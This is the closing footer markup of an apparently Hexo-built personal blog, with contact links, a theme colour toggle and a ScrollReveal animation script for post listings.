                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>